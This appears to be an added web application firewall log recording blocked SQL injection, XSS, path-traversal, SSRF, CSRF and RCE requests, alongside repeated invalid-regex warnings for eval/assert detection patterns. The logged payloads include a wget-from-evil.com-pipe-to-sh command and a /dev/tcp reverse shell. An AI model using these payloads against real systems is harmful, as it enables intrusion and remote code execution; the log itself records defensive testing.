+[2025-04-28 07:59:45] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:00:02] INFO | SSRF BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=(?:[a-z0-9-]+\.)?(?:internal|intranet|svc|local)(?:\.[a-z]{2,})* | payload=localhost:5000
+[2025-04-28 08:03:29] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:03:29] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:03:29] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:03:33] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:03:33] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:03:33] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:07:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:07:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:07:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:07:03] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:07:03] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:07:03] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:09:26] INFO | SSRF BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=matched-pattern | payload=http://localhost:5000
+[2025-04-28 08:12:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:12:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:12:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:12:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:12:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:12:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:15:14] INFO | XSS BLOCK | severity=Medium | ip=127.0.0.1       Localhost                      | pattern=matched-pattern | payload=<script>alert(1)</script>
+[2025-04-28 08:15:25] INFO | LFI BLOCK | severity=Medium | ip=127.0.0.1       Localhost                      | pattern=matched-pattern | payload=../../../../etc/passwd
+[2025-04-28 08:15:32] INFO | RCE BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=matched-pattern | payload=;wget http://evil.com/x.sh|sh
+[2025-04-28 08:15:41] WARNING | Blocked request from banned IP: 127.0.0.1
+[2025-04-28 08:16:40] WARNING | Blocked request from banned IP: 127.0.0.1
+[2025-04-28 08:17:02] INFO | SSRF BLOCK | severity=High | ip=10.10.10.10     Unknown                        | pattern=matched-pattern | payload=internal access attempt
+[2025-04-28 08:42:03] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:42:03] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:42:03] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:42:04] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:42:04] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:42:04] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:47:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:47:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:47:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:57:20] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:57:20] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:57:20] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 08:57:21] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 08:57:21] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 08:57:21] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 09:01:42] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 09:01:42] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 09:01:42] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 09:01:42] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 09:01:42] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 09:01:42] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 09:04:25] INFO | SQLi BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=matched-pattern | payload=' or 1=1
+[2025-04-28 09:04:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 09:04:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 09:04:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 09:04:53] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 09:04:53] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 09:04:53] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 09:05:28] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 09:05:28] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 09:05:28] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 09:06:39] INFO | CSRF BLOCK | severity=Medium | ip=127.0.0.1       Localhost                      | pattern=missing or mismatched CSRF token; Origin/Referer not same-origin | payload=normal data
+[2025-04-28 09:10:59] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 09:10:59] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 09:10:59] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 11:06:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 11:06:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 11:06:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 11:06:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 11:06:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 11:06:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 11:08:18] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 11:08:18] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 11:08:18] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 11:08:58] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 11:08:58] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 11:08:58] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 11:09:13] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 11:09:13] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 11:09:13] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 11:12:09] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 11:12:09] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 11:12:09] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 11:12:38] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 11:12:38] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 11:12:38] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:19:35] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:19:35] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:19:35] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:19:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:19:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:19:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:23:35] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:23:35] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:23:35] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:24:15] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:24:15] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:24:15] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:25:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:25:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:25:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:25:06] INFO | SSRF BLOCK | severity=High | ip=10.10.10.10     Unknown                        | pattern=matched-pattern | payload=internal access attempt
+[2025-04-28 12:25:34] INFO | SSRF BLOCK | severity=High | ip=10.10.10.10     Unknown                        | pattern=matched-pattern | payload=internal access attempt
+[2025-04-28 12:25:36] INFO | SSRF BLOCK | severity=High | ip=10.10.10.10     Unknown                        | pattern=matched-pattern | payload=internal access attempt
+[2025-04-28 12:25:37] WARNING | Blocked request from banned IP: 10.10.10.10
+[2025-04-28 12:25:51] WARNING | Blocked request from banned IP: 10.10.10.10
+[2025-04-28 12:26:54] WARNING | Blocked request from banned IP: 10.10.10.10
+[2025-04-28 12:30:19] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:30:19] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:30:19] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:32:05] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:32:05] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:32:05] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:32:23] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:32:23] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:32:23] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:32:26] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:32:26] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:32:26] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:32:27] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:32:27] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:32:27] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:32:55] INFO | CSRF BLOCK | severity=Medium | ip=127.0.0.1       Localhost                      | pattern=missing or mismatched CSRF token; Origin/Referer not same-origin | payload=normal data
+[2025-04-28 12:33:50] DEBUG | ALLOW | total_allowed=1 | ip=127.0.0.1       | payload=Hello world normal text
+[2025-04-28 12:33:55] INFO | SQLi BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=matched-pattern | payload=1' OR '1'='1
+[2025-04-28 12:34:03] INFO | XSS BLOCK | severity=Medium | ip=127.0.0.1       Localhost                      | pattern=matched-pattern | payload=<script>alert('hacked')</script>
+[2025-04-28 12:36:11] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:36:11] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:36:11] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:36:14] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:36:14] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:36:14] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:36:15] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:36:15] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:36:15] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:36:23] DEBUG | ALLOW | total_allowed=1 | ip=127.0.0.1       | payload=normal data
+[2025-04-28 12:36:53] INFO | RCE BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=matched-pattern | payload=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+[2025-04-28 12:38:00] DEBUG | ALLOW | total_allowed=2 | ip=127.0.0.1       | payload=Hello normal world
+[2025-04-28 12:38:21] DEBUG | ALLOW | total_allowed=3 | ip=123.45.67.89    | payload=Hello world from forwarded IP
+[2025-04-28 12:38:30] INFO | SQLi BLOCK | severity=High | ip=88.99.123.77    🇩🇪 Germany, Falkenstein        | pattern=matched-pattern | payload=1 OR 1=1 --
+[2025-04-28 12:38:57] INFO | XSS BLOCK | severity=Medium | ip=154.12.67.91    🇺🇸 United States, Atlanta      | pattern=matched-pattern | payload=<img src=x onerror=alert('XSS')>
+[2025-04-28 12:39:06] INFO | LFI BLOCK | severity=Medium | ip=213.45.22.8     🇮🇹 Italy, Milan                | pattern=matched-pattern | payload=../../../../../etc/passwd
+[2025-04-28 12:39:35] INFO | SSRF BLOCK | severity=High | ip=51.15.100.20    🇳🇱 The Netherlands, Amsterdam  | pattern=matched-pattern | payload=http://127.0.0.1:8000/internal-api
+[2025-04-28 12:39:43] DEBUG | ALLOW | total_allowed=4 | ip=192.0.2.10      | payload=normal_data_but_no_csrf_protection
+[2025-04-28 12:40:08] INFO | CSRF BLOCK | severity=Medium | ip=192.0.2.10      Unknown                        | pattern=missing or mismatched CSRF token; Origin/Referer not same-origin | payload=normal_data_but_missing_csrf_token
+[2025-04-28 12:42:58] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:42:58] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:42:58] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 12:42:59] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 12:42:59] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 12:42:59] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 13:30:25] INFO | SQLi BLOCK | severity=High | ip=51.88.66.11     🇺🇸 United States, New York     | pattern=matched-pattern | payload=1' OR '1'='1
+[2025-04-28 13:30:33] DEBUG | ALLOW | total_allowed=5 | ip=88.12.55.23     | payload=Normal body content
+[2025-04-28 13:30:43] DEBUG | ALLOW | total_allowed=6 | ip=122.88.44.55    | payload=Normal body again
+[2025-04-28 13:32:10] DEBUG | ALLOW | total_allowed=7 | ip=122.88.44.55    | payload=Normal body again
+[2025-04-28 13:32:22] DEBUG | ALLOW | total_allowed=8 | ip=88.12.55.23     | payload=Normal body content
+[2025-04-28 13:33:33] DEBUG | ALLOW | total_allowed=9 | ip=88.12.55.23     | payload=Normal body content
+[2025-04-28 13:34:10] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 13:34:10] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 13:34:10] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 13:35:12] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 13:35:12] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 13:35:12] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 13:35:22] INFO | XSS BLOCK | severity=Medium | ip=88.12.55.23     🇪🇸 Spain, Seville              | pattern=matched-pattern | payload=<script>alert('XSS')</script>
+[2025-04-28 13:35:31] DEBUG | ALLOW | total_allowed=10 | ip=122.88.44.55    | payload=Clean body
+[2025-04-28 13:36:15] DEBUG | ALLOW | total_allowed=11 | ip=122.88.44.55    | payload=Clean body
+[2025-04-28 13:36:52] INFO | SQLi BLOCK | severity=High | ip=122.88.44.55    🇨🇳 China, Jinrongjie           | pattern=matched-pattern | payload=user_pref='; DROP TABLE users; --
+[2025-04-28 16:23:05] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 16:23:05] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 16:23:05] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 16:23:06] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 16:23:06] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 16:23:06] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 07:34:34] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 07:34:34] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 07:34:34] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 07:34:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 07:34:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 07:34:36] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 07:55:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 07:55:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 07:55:02] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-29 07:55:10] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-29 07:55:10] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-29 07:55:10] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
